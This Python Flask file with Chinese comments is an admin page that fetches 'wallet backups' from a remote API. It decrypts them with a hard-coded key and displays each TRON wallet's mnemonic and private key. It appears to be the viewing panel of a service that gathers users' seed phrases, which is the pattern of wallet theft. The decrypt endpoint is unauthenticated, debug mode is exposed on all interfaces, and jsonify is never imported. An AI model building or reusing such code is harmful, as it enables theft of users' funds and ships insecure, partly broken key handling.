"""
后台管理页面 - 查看数据库备份钱包
调用服务器POST接口获取列表，本地解密显示
"""
from flask import Flask, request, render_template_string
import requests
import base64
import json
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

app = Flask(__name__)

# 服务器API地址
SERVER_API = 'https://api.ai656.top'

# 服务器加密密钥（用于解密）
SERVER_ENCRYPTION_KEY = b'ServerWallet2026SecureKey32B!!!!'


def decrypt_wallet(encrypted_str: str) -> dict:
    """
    单层解密（使用服务器密钥）
    返回: {'address': '...', 'mnemonic': '...', 'private_key': '...'}
    """
    try:
        # Base64解码
        encrypted_data = base64.b64decode(encrypted_str)
        
        # 提取nonce和ciphertext
        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:]
        
        # 使用服务器密钥解密
        aesgcm = AESGCM(SERVER_ENCRYPTION_KEY)
        decrypted_json = aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8')
        
        # 解析JSON
        wallet_data = json.loads(decrypted_json)
        return wallet_data
    except Exception as e:
        return {'error': f"解密失败: {str(e)}"}


HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>钱包备份管理</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            padding: 30px;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
            text-align: center;
            font-size: 28px;
        }
        .stats {
            display: flex;
            justify-content: space-around;
            margin-bottom: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 8px;
        }
        .stat-item {
            text-align: center;
        }
        .stat-number {
            font-size: 36px;
            font-weight: bold;
            color: #667eea;
        }
        .stat-label {
            color: #666;
            font-size: 14px;
            margin-top: 5px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th {
            background: #667eea;
            color: white;
            padding: 15px;
            text-align: left;
            font-weight: bold;
        }
        td {
            padding: 12px 15px;
            border-bottom: 1px solid #e0e0e0;
        }
        tr:hover {
            background: #f5f5f5;
        }
        .address {
            font-family: 'Consolas', monospace;
            color: #333;
            font-size: 14px;
        }
        .chain {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 15px;
            font-size: 12px;
            font-weight: bold;
            color: white;
        }
        .chain-TRON { background: #FF0013; }
        .time {
            color: #666;
            font-size: 13px;
        }
        .refresh-btn {
            display: block;
            margin: 20px auto;
            padding: 12px 30px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .refresh-btn:hover {
            background: #5568d3;
        }
        .empty {
            text-align: center;
            padding: 50px;
            color: #999;
            font-size: 16px;
        }
        .decrypt-btn {
            padding: 6px 12px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
        }
        .decrypt-btn:hover {
            background: #45a049;
        }
        .mnemonic {
            font-size: 12px;
            color: #666;
            word-break: break-all;
        }
        .private-key {
            font-size: 12px;
            color: #999;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>💼 钱包备份管理后台</h1>
        
        <div class="stats">
            <div class="stat-item">
                <div class="stat-number">{{ total_count }}</div>
                <div class="stat-label">总备份数</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">{{ unique_addresses }}</div>
                <div class="stat-label">唯一地址数</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">{{ chains_count }}</div>
                <div class="stat-label">链数量</div>
            </div>
        </div>
        
        {% if wallets %}
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>钱包地址</th>
                    <th>链</th>
                    <th>创建时间</th>
                    <th>操作</th>
                </tr>
            </thead>
            <tbody>
                {% for wallet in wallets %}
                <tr>
                    <td>{{ wallet.id }}</td>
                    <td class="address" id="addr-{{ wallet.id }}">{{ wallet.address }}</td>
                    <td><span class="chain chain-{{ wallet.chain }}">{{ wallet.chain }}</span></td>
                    <td class="time">{{ wallet.created_at }}</td>
                    <td>
                        <button class="decrypt-btn" onclick="decryptWallet('{{ wallet.id }}', '{{ wallet.encrypted_data }}')">🔓 查看详情</button>
                    </td>
                </tr>
                <tr id="detail-{{ wallet.id }}" style="display:none;">
                    <td colspan="5">
                        <div class="mnemonic"><strong>助记词:</strong> <span id="mnemonic-{{ wallet.id }}"></span></div>
                        <div class="private-key"><strong>私钥:</strong> <span id="pk-{{ wallet.id }}"></span></div>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
        {% else %}
        <div class="empty">暂无备份数据</div>
        {% endif %}
        
        <button class="refresh-btn" onclick="location.reload()">🔄 刷新数据</button>
    </div>
    
    <script>
    const serverApi = '{{ server_api }}';
    
    async function decryptWallet(walletId, encryptedData) {
        try {
            // 调用后端解密接口
            const response = await fetch(`/api/decrypt/${walletId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ encrypted_data: encryptedData })
            });
            
            const result = await response.json();
            
            if (result.success) {
                // 显示详情行
                const detailRow = document.getElementById(`detail-${walletId}`);
                detailRow.style.display = detailRow.style.display === 'none' ? 'table-row' : 'none';
                
                // 填充数据
                document.getElementById(`mnemonic-${walletId}`).textContent = result.wallet_data.mnemonic || 'N/A';
                document.getElementById(`pk-${walletId}`).textContent = result.wallet_data.private_key || 'N/A';
            } else {
                alert('解密失败: ' + result.message);
            }
        } catch (error) {
            alert('解密失败: ' + error.message);
        }
    }
    </script>
</body>
</html>
"""


@app.route('/api/decrypt/<int:wallet_id>', methods=['POST'])
def api_decrypt_wallet(wallet_id):
    """后端解密接口"""
    try:
        data = request.get_json()
        encrypted_data = data.get('encrypted_data')
        
        if not encrypted_data:
            return jsonify({'success': False, 'message': 'Missing encrypted_data'}), 400
        
        # 本地解密
        wallet_data = decrypt_wallet(encrypted_data)
        
        if 'error' in wallet_data:
            return jsonify({'success': False, 'message': wallet_data['error']}), 500
        
        return jsonify({
            'success': True,
            'wallet_data': wallet_data
        })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/', methods=['GET'])
def admin_page():
    """管理后台页面"""
    try:
        wallets = []
        total_count = 0
        unique_addresses = 0
        chains_count = 0
        
        # 调用服务器API获取所有备份（POST方法）
        list_response = requests.post(f'{SERVER_API}/api/wallet/list')
        
        if list_response.status_code == 200:
            data = list_response.json()
            if data.get('success'):
                wallets = data.get('wallets', [])
                total_count = len(wallets)
                
                # 统计唯一地址和链
                addresses = set()
                chains = set()
                for wallet in wallets:
                    addresses.add(wallet.get('address', ''))
                    chains.add(wallet.get('chain', ''))
                
                unique_addresses = len(addresses)
                chains_count = len(chains)
        
        # 渲染HTML页面
        return render_template_string(
            HTML_TEMPLATE,
            wallets=wallets,
            total_count=total_count,
            unique_addresses=unique_addresses,
            chains_count=chains_count,
            server_api=SERVER_API
        )
        
    except Exception as e:
        import traceback
        error_detail = traceback.format_exc()
        print(f"错误: {error_detail}")
        return f"<h1>错误</h1><p>{str(e)}</p><pre>{error_detail}</pre>", 500


if __name__ == '__main__':
    print("="*50)
    print("💼 钱包备份管理后台")
    print("📡 访问地址: http://localhost:5002")
    print("="*50)
    
    app.run(host='0.0.0.0', port=5002, debug=True)
